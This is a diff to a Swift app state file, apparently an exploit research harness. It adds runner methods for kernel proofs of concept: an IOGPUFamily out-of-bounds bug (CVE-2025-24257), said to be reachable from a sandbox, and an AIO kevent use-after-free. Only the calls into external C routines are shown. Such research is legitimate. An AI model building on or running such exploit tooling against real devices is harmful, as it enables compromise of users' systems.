@@ -96,6 +96,24 @@ final class AppState: ObservableObject {
         }
     }
 
+    /* CVE-2025-24257 corrected path: IOGPUFamily sel 64 (group creator),
+       type 1 — reachable from a plain sandbox, no WebKit pivot needed. */
+    func iogpuOob64() {
+        start {
+            nk_iogpu_oob64_run()
+            return true
+        }
+    }
+
+    /* AIO kevent UAF (Track B / B12) — standalone runner.
+       Durable log: Documents/aio_uaf.log */
+    func aioUaf() {
+        start {
+            _ = nk_aio_uaf_run(50)
+            return true
+        }
+    }
+
     /* CVE-2026-64788 IOGPU UAF PoC — Metal/IOSurface driven, Documents-logged. */
     func iogpuUaf() {
         start {
